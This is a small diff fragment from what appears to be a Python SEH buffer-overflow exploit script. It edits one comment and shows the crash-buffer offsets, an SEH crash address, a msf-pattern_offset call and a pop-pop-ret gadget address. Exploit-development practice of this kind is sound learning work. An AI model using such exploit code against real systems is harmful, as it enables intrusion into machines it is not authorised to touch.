@@ -21,7 +21,7 @@ eip_control = "A"*offset + "BBBB" + "C"*(byte_crash - offset - 4)
 SEH_crash_address = 0x625010B4
 SEH_offset = int(os.popen("msf-pattern_offset -q " + str(SEH_crash_address) + " | awk '{print $6}'").read())
 
-# "!mona seh" to get the pop_pop_retn --> avoid bad characters by intuition
+# "!mona seh" to get the pop_pop_retn --> avoid bad characters
 pop_pop_retn = 0x61617619
 
 #----------------------------2 - BAD CHARACTERS TESTING --> EVIL_BUFFER = badchars---------------------#
